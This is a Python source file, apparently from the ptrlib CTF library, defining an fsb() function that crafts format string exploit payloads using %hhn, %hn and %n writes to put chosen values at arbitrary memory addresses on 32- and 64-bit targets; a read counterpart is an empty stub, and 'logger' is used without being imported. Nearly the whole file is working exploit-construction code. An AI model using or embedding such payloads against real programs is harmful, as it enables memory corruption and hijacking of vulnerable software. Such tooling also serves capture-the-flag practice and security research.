from ptrlib.util.encoding import *
from ptrlib.util.packing import *

def fsb_read(pos, reads, written=0, bits=32):
    # TODO
    return

def fsb(pos, writes, bs=1, written=0, bits=32, null=True):
    """Craft a Format String Exploit payload
    
    Args:
        pos (int)    : The position where your input appears on the stack
        writes (list): A disctionary which has the addresses as keys and the data as values
        bs (int)     : The bytes to write at once (must be 1, 2, 4)
        written (int): The byte length to be written before this payload
        bits (int)   : The address bits (32 or 64)
        null (bool)  : Weather write 0 or not

    Returns:
        bytes: crafted payload
    """
    assert bs == 1 or bs == 2 or bs == 4
    
    # set prefix
    if bs == 1:
        prefix = "hhn"
        len_data = 3
    elif bs == 2:
        prefix = "hn"
        len_data = 5
    else:
        prefix = "n"
        len_data = 10
        
    # craft payload
    payload = b''
    if bits == 32:
        # 32bit mode
        table = {}
        if bs == 1:
            for addr in writes:
                for i in range(4):
                    table[addr + i] = (writes[addr] >> (i * 8)) & 0xff
        elif bs == 2:
            for addr in writes:
                for i in range(2):
                    table[addr + i * 2] = (writes[addr] >> (i * 16)) & 0xffff
            
        n = written + len(table) * 4
        i = 0
        
        for addr in table:
            payload += p32(addr)
            
        for addr in table:
            if bs == 1:
                l = ((table[addr] - n - 1) & 0xff) + 1
            elif bs == 2:
                l = ((table[addr] - n - 1) & 0xffff) + 1
            elif bs == 4:
                l = ((table[addr] - n - 1) & 0xffffffff) + 1
            payload += str2bytes("%{0}c%{1}${2}".format(
                l, pos + i, prefix
            ))
            n += l
            i += 1
            
    elif bits == 64:
        # 64bit mode
        table = {}
        if bs == 1:
            for addr in writes:
                for i in range(8):
                    if not null and (writes[addr] >> (i * 8)) & 0xff == 0: continue
                    table[addr + i] = (writes[addr] >> (i * 8)) & 0xff
        elif bs == 2:
            for addr in writes:
                for i in range(4):
                    if not null and (writes[addr] >> (i * 16)) & 0xffff == 0: continue
                    table[addr + i * 2] = (writes[addr] >> (i * 16)) & 0xffff
        elif bs == 4:
            for addr in writes:
                for i in range(2):
                    if not null and (writes[addr] >> (i * 32)) & 0xffffffff == 0: continue
                    table[addr + i * 4] = (writes[addr] >> (i * 32)) & 0xffffffff

        n = written
        poslen_list = [len(str(pos + i)) for i in range(len(table))]
        paylen = written + (4 + len_data + len(prefix)) * len(table) + sum(poslen_list)
        if paylen % 8 != 0:
            paylen += 8 - (paylen % 8)
        post_pos = pos + paylen // 8

        # adjust
        while True:
            post_poslen_list = [len(str(post_pos + i)) for i in range(len(table))]
            post_paylen = written + (4 + len_data + len(prefix)) * len(table) + sum(post_poslen_list)
            if post_paylen % 8 != 0:
                post_paylen += 8 - (post_paylen % 8)
            if post_paylen == paylen:
                break
            paylen = post_paylen
            post_pos = pos + post_paylen // 8

        i = 0
        payload = b''
        for addr in table:
            if bs == 1:
                l = ((table[addr] - n - 1) & 0xff) + 1
                payload += str2bytes("%{0:03}c%{1}${2}".format(
                    l, post_pos + i, prefix
                ))
            elif bs == 2:
                l = ((table[addr] - n - 1) & 0xffff) + 1
                payload += str2bytes("%{0:05}c%{1}${2}".format(
                    l, post_pos + i, prefix
                ))
            elif bs == 4:
                l = ((table[addr] - n - 1) & 0xffffffff) + 1
                payload += str2bytes("%{0:010}c%{1}${2}".format(
                    l, post_pos + i, prefix
                ))
            n += l
            i += 1

        payload += b'A' * (post_paylen - len(payload) - written)
        for addr in table:
            payload += p64(addr)
        
    else:
        logger.error("Invalid bits specified")
        return None
    
    return payload
